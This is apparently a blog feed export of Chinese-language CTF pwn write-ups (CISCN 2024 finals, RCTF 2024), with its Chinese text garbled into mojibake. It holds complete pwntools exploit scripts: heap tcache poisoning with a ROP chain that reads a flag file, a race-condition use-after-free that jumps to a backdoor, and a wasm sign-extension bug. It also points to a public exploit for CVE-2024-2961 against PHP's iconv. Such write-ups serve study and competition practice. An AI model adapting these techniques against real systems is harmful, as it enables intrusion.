4</span><br>add(<span class="hljs-number">0x300</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 6</span><br>convert(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 4</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xc11</span>))<br>delete(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x210</span>)<br>show(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content:&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x210</span>)<br>libcbase=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x203b20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+p64(libcbase+<span class="hljs-number">0x203b20</span>)*<span class="hljs-number">2</span><br>payload+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0x40</span>)+p64(<span class="hljs-number">0x20</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)<br>edit(<span class="hljs-number">4</span>,payload)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)  <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)  <span class="hljs-comment"># 7</span><br>delete(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x210</span>)<br>show(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content:&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x210</span>)<br>heap=(u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="hljs-number">12</span>)-<span class="hljs-number">0x5000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>))<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)  <span class="hljs-comment"># 5</span><br>delete(<span class="hljs-number">7</span>)<br>delete(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+p64(((heap+<span class="hljs-number">0x5000</span>)&gt;&gt;<span class="hljs-number">12</span>)^(libcbase+<span class="hljs-number">0x20ad20</span>)))<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)  <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x38</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>) <span class="hljs-comment"># 7</span><br>show(<span class="hljs-number">7</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content:&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>)<br>stack=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x211</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>))<br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 8</span><br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 9</span><br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x211</span>)+p64(((heap+<span class="hljs-number">0x5000</span>)&gt;&gt;<span class="hljs-number">12</span>)^(stack-<span class="hljs-number">0x198</span>)))<br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;./flag\x00&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>open_addr=libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]+libcbase<br>read_addr=libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]+libcbase<br>puts_addr=libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]+libcbase<br>ret=libcbase+<span class="hljs-number">0x2882f</span><br>rdi=libcbase+<span class="hljs-number">0x10f75b</span><br>rsi=libcbase+<span class="hljs-number">0x110a4d</span><br>rcx=libcbase+<span class="hljs-number">0xa876e</span><br>rdx=libcbase+<span class="hljs-number">0xab891</span><br>rop=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(rdi)+p64(heap+<span class="hljs-number">0x5a40</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>rop+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(heap)+p64(rcx)+p64(heap+<span class="hljs-number">0x100</span>)+p64(rdx)+p64(<span class="hljs-number">0x30</span>)+p64(read_addr)<br>rop+=p64(rdi)+p64(heap)+p64(puts_addr)<br>add(<span class="hljs-number">0x200</span>,rop)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>å¹³å°å¼€äº†åçœ‹åˆ°æœ‰ä¸ªphpé¢˜ç«é€Ÿè¶æ”¶æ‰‹æœºçš„æœ€åä¸€åˆ†é’Ÿcloneäº†ä¸€ä»½phpæºç ï¼Œç»“æœè¿™é¢˜çœ‹éƒ½æ²¡çœ‹ä¸€çœ¼ï¼Œ<em>è€Œä¸”è¿™é¢˜æœ‰æºç ä¹Ÿæ²¡å•¥ç”¨</em></p><h2 id="æ€è·¯-3"><a href="#æ€è·¯-3" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p><em>èµ›æ—¶æåˆ°iconvçš„æ—¶å€™zç¥å°±æåˆ°äº†è¿™ä¸ªCVEï¼Œç»“æœiconvé‚£é¢˜ä¸ç”¨è¿™ä¸ªCVEä½†phpé¢˜ç”¨ï¼Œzç¥yydsğŸ‚</em></p><ul><li><p>nginxçš„é…ç½®æ–‡ä»¶ï¼Œä¸»è¦æ˜¯æ‰¾ç«¯å£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">/etc/nginx/sites-available/default</span><br><br>server &#123;<br>    listen 9999 default_server;<br>    listen [::]:9999 default_server;<br><br>    root /var/www/html;<br><br>    index index.html;<br><br>    server_name _;<br><br>    location / &#123;<br>        try_files $uri $uri/ /index.html;<br>    &#125;<br><br>    location ~ \.php$ &#123;<br>        fastcgi_split_path_info ^(.+\.php)(/.+)$;<br>        fastcgi_pass unix:/var/run/php/php8.3-fpm.sock;<br>        fastcgi_index index.php;<br>        include fastcgi_params;<br>        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;<br>        fastcgi_param PATH_INFO $fastcgi_path_info;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æœåŠ¡ï¼Œä¸€ä¸ªæ–‡ä»¶è¯»å–ç³»ç»Ÿ</p><img src="/2024/07/29/2024%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bpwn-wp/html.png" class title="html"></li><li><p>data.phpï¼Œä¸»è¦æ³¨æ„äº¤äº’æœ‰base64ç¼–ç å’ŒAESåŠ å¯†ï¼Œè¿˜æœ‰é»‘åå•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">base64_decode_data</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-comment">// AESåŠ å¯†å’Œè§£å¯†å‡½æ•°</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aes_encrypt</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>, <span class="hljs-variable">$key</span></span>) </span>&#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">hash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$key</span>, <span class="hljs-literal">true</span>);<br>    <span class="hljs-variable">$iv</span> = <span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-number">16</span>);<br>    <span class="hljs-variable">$encrypted</span> = <span class="hljs-title function_ invoke__">openssl_encrypt</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;aes-256-cbc&#x27;</span>, <span class="hljs-variable">$key</span>, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>);<br>    <span class="hljs-variable">$encrypted</span> = <span class="hljs-variable">$iv</span> . <span class="hljs-variable">$encrypted</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$encrypted</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_blacklisted</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27;/root&#x27;</span>, <span class="hljs-string">&#x27;/home&#x27;</span>, <span class="hljs-string">&#x27;/media&#x27;</span>, <span class="hljs-string">&#x27;/mnt&#x27;</span>, <span class="hljs-string">&#x27;/lib64&#x27;</span>, <span class="hljs-string">&#x27;/lib&#x27;</span>]; <span class="hljs-comment">// æ·»åŠ å…¶ä»–é»‘åå•ç›®å½•</span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blacklisted_dir</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$path</span>), <span class="hljs-variable">$blacklisted_dir</span>) === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-comment">// è·å–Base64ç¼–ç çš„æ–‡ä»¶è·¯å¾„å¹¶è¿›è¡ŒBase64è§£ç </span><br><span class="hljs-variable">$encoded_file</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">base64_decode_data</span>(<span class="hljs-variable">$encoded_file</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_blacklisted</span>(<span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Access to this directory is not allowed.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// è·å–æ–‡ä»¶å†…å®¹</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-comment">// åŠ å¯†æ–‡ä»¶å†…å®¹</span><br><span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;Welcome_to_CISCN_2024_Final&#x27;</span>;  <span class="hljs-comment">// Actual key</span><br><span class="hljs-variable">$encrypted_data</span> = <span class="hljs-title function_ invoke__">aes_encrypt</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$key</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your encrypted file : <span class="hljs-subst">$encrypted_data</span>&quot;</span>;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>é‡ç‚¹æ¥äº†</strong></p><ul><li><p><a href="https://github.com/ambionics/cnext-exploits/">CVE-2024-2961</a>ï¼Œæœ‰ç°æˆçš„expï¼Œæ”¹ä¸€ä¸‹äº¤äº’å’Œæ–‡ä»¶è·å–å°±å¯ä»¥</p></li><li><p>è´´ä¸€å¼ æˆåŠŸæˆªå›¾</p><img src="/2024/07/29/2024%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bpwn-wp/success1.png" class title="success1"><img src="/2024/07/29/2024%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bpwn-wp/success2.png" class title="success2"></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 rctf pwn wp</title>
    <link href="/2024/05/28/2024rctfpwnwp/"/>
    <url>/2024/05/28/2024rctfpwnwp/</url>
    
    <content type="html"><![CDATA[<p>å¿™ç¢Œçš„åŠå‘¨â€¦â€¦</p><p>å‘¨å››å‡ºå‘å»ç¦å·â†’å‘¨äº”é“ä¸‰â†’å‘¨å…­é…’åº—æ‰“rctfâ†’å‘¨æ—¥è¿”ç¨‹+äº¬éº’ï¼ˆè¿˜å»¶è¯¯äº†å°†è¿‘ä¸¤ä¸ªå°æ—¶^V^ï¼‰</p><p>é“ä¸‰åªå‡ºäº†ç­¾åˆ°ï¼Œrctfåšäº†ä¸¤é“é¢˜çš„å‰æœŸå‡†å¤‡å·¥ä½œï¼Œäº¬éº’é›¶è¾“å‡ºï¼›æœ€åé“ä¸‰äºŒç­‰ï¼Œäº¬éº’ä¹Ÿè¿›äº†ï¼ˆæ„Ÿè°¢é˜Ÿå‹orzï¼‰ï¼Œç»“æœä¹Ÿç®—ä¸é”™</p><p>æŸäººåˆå› ä¸ºè¢«èšŠå­å’¬è¿‡æ•äº†^V^ï¼Œè¿˜æŒºä¸¥é‡æ‰€ä»¥åƒäº†è¿‡æ•è¯ï¼Œåƒå®Œæ•´ä¸ªäººåˆå‘†åˆå›°ï¼Œå»ç¦å·ä¹‹å‰å³èƒ³è†Šæ•´ä¸ªè‚¿äº†ï¼Œåœ¨ç¦å·åˆå–œæä¸‰å››å£ï¼ˆä¸€æ™šä¸Šè¢«èšŠå­å“é†’næ¬¡ï¼‰ï¼Œå›æ¥ä¹‹åèƒ³è†Šå¥½äº†ï¼Œå³è„šè¸è‚¿äº†ï¼ˆè‚¿çš„æˆ‘å®¤å‹ä»¥ä¸ºæˆ‘è„šå´´äº†ï¼‰ï¼ŒèšŠå­æ€ä¹ˆè¿˜ä¸ç­ç»(â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”»</p><span id="more"></span><h1 id="Taskgo"><a href="#Taskgo" class="headerlink" title="Taskgo"></a>Taskgo</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>raceï¼Œæ¯”èµ›åšçš„æ—¶å€™ä¸»è¦é è¯•ï¼Œç°åœ¨æ‹ä¸€ä¸‹é€»è¾‘</p><p>base::TaskRunner::PostTaskå¯åŠ¨ä»»åŠ¡ï¼Œä¸€å…±ä¸¤ä¸ªçº¿ç¨‹</p><ul><li>MainThreadï¼ˆg_main_thread_task_runnerï¼‰<ul><li>æ‰€æœ‰èœå•</li><li>MagicCastle::SwitchHandle</li><li>MagicCastle::BuyMSï¼ŒMagicCastle::DropMSï¼ŒMagicCastle::LearnMS</li><li>FiveStar</li></ul></li><li>IOThreadï¼ˆg_io_thread_task_runnerï¼‰<ul><li>RapidAdvance::PickHandle</li><li>RapidAdvance::StartRA</li><li>MagicHeld::Gods</li><li>Log</li><li>NoteStar</li></ul></li></ul><h3 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h3><ul><li>RapidAdvanceå’ŒMagicCastleä¸æ˜¯ä¸€ä¸ªçº¿ç¨‹</li><li>CheckMoneyä¼šå…ˆsleepå†ç»“ç®—</li><li>RapidAdvanceçš„CheckMoney sleepå¡ä½çš„æ—¶å€™å¯ä»¥è°ƒç”¨BuyMSæŠŠé’±åˆ·æˆè´Ÿæ•°</li></ul><p>é›†é½ä¸‰ä¸ªMSå°±å¯ä»¥1337è°ƒç”¨Godsè·å¾—systemå’ŒBackDooråœ°å€</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><ul><li><p>BuyMSä¸­ä¼šç”³è¯·ä¸€ä¸ªç»“æ„ä½“MagicHeld</p><img src="/2024/05/28/2024rctfpwnwp/vtable.png" class title="vtable"></li><li><p>DropMSä¸­ä¼šè°ƒç”¨MagicHeld::~MagicHeldæŠŠå®ƒé‡Šæ”¾æ‰</p><img src="/2024/05/28/2024rctfpwnwp/free.png" class title="free"></li><li><p>MagicHeld::Godsçš„å‚æ•°ä¹Ÿæ˜¯MagicHeldï¼ˆåºŸåºŸçš„ä¸€å¥è¯(lllï¿¢Ï‰ï¿¢)ï¼‰</p><img src="/2024/05/28/2024rctfpwnwp/gods.png" class title="gods"><ul><li><p>åˆ©ç”¨MagicHeldè¾“å‡ºLogçš„åœ°å€</p><img src="/2024/05/28/2024rctfpwnwp/printf.png" class title="printf"></li><li><p>è°ƒç”¨Log</p><img src="/2024/05/28/2024rctfpwnwp/log.png" class title="log"></li></ul></li><li><p>RapidAdvanceé‡Œä¹°ä¸¤æ¬¡å¯ä»¥è°ƒç”¨FiveStarå’ŒNoteStarç•™Comment</p></li></ul><p>æ‰€ä»¥å¯ä»¥é€šè¿‡raceæŠŠMagicHeld freeæ‰å†é€šè¿‡Commentç”³è¯·å›æ¥æ”¹æ‰ï¼Œæ‰§è¡ŒBackDoor</p><p>æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>Gods</li><li>DropMS</li><li>RapidAdvanceä¸¤æ¬¡ï¼Œç•™Comment</li></ul><p><em>race &#x3D;&#x3D; ç„å­¦</em></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choose</span>(<span class="hljs-params">idx</span>):<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    choose(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rapids</span>(<span class="hljs-params">s</span>):<br>    choose(<span class="hljs-number">1</span>)<br>    choose(s)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic_buy</span>(<span class="hljs-params">s</span>):<br>    choose(<span class="hljs-number">2</span>)<br>    choose(<span class="hljs-number">1</span>)<br>    choose(s)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic_drop</span>():<br>    choose(<span class="hljs-number">2</span>)<br>    choose(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic_learn</span>():<br>    choose(<span class="hljs-number">2</span>)<br>    choose(<span class="hljs-number">3</span>)<br><br><br>p=process(<span class="hljs-string">&#x27;./ctf&#x27;</span>)<br>name=<span class="hljs-string">b&#x27;flag&#x27;</span><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Hello, nice day. Player, please tell me your name: \n&#x27;</span>,name)<br>rapids(<span class="hljs-number">3</span>)<br>magic_buy(<span class="hljs-number">2</span>)<br>magic_learn()<br>magic_drop()<br>magic_buy(<span class="hljs-number">1</span>)<br>magic_learn()<br>magic_drop()<br>magic_buy(<span class="hljs-number">3</span>)<br>magic_learn()<br>choose(<span class="hljs-number">2</span>)<br>choose(<span class="hljs-number">1337</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>system=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>log=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>backdoor=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(log))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(backdoor))<br><br>choose(<span class="hljs-number">2</span>)<br>choose(<span class="hljs-number">1337</span>)<br><br>magic_drop()<br><br>rapids(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Hope your next visit.&#x27;</span>)<br>rapids(<span class="hljs-number">1</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Input the Comments: &#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(backdoor))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="Mine"><a href="#Mine" class="headerlink" title="Mine"></a>Mine</h1><p>åˆæ˜¯wasmï¼Œqwbç»å…¸å†ç°</p><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æ‰«é›·</p><ul><li>uncoverï¼šUæ‰«é›·</li><li>maskï¼šMæ ‡è®°</li><li>changeï¼šUä¸€æ¬¡åè¾“å…¥åˆ«çš„å­—æ¯å¯ä»¥æ›´æ”¹æ•´ä¸ªmapçš„å†…å®¹</li></ul><p>æ´åœ¨changeé‡Œ</p><img src="/2024/05/28/2024rctfpwnwp/movsx.png" class title="movsx"><p>r9bä¸ºè´Ÿæ•°çš„æ—¶å€™movsxä¼šæ‰©å±•ä¸ºè´Ÿæ•°ï¼Œå¯ä»¥ç›´æ¥æ”¹nameçš„æŒ‡é’ˆï¼ŒæŒ‡å‘flagå³å¯</p><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br><br>p=process(<span class="hljs-string">&#x27;./run.sh&#x27;</span>)<br>pause()<br>p.sendlineafter(<span class="hljs-string">b&quot;Your Name:&quot;</span>,<span class="hljs-string">b&quot;a&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;mark): &quot;</span>,<span class="hljs-string">b&quot;0 0 U&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;mark): &quot;</span>,<span class="hljs-string">b&quot;0 0 A&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        sleep(<span class="hljs-number">0.02</span>)<br>        p.sendlineafter(<span class="hljs-string">b&quot;]:&quot;</span>,<span class="hljs-string">b&quot;n&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;]:&quot;</span>,<span class="hljs-string">b&quot;y &quot;</span>+p8(<span class="hljs-number">0x90</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    sleep(<span class="hljs-number">0.02</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;]:&quot;</span>,<span class="hljs-string">b&quot;n&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="dwebp"><a href="#dwebp" class="headerlink" title="dwebp"></a>dwebp</h1><h2 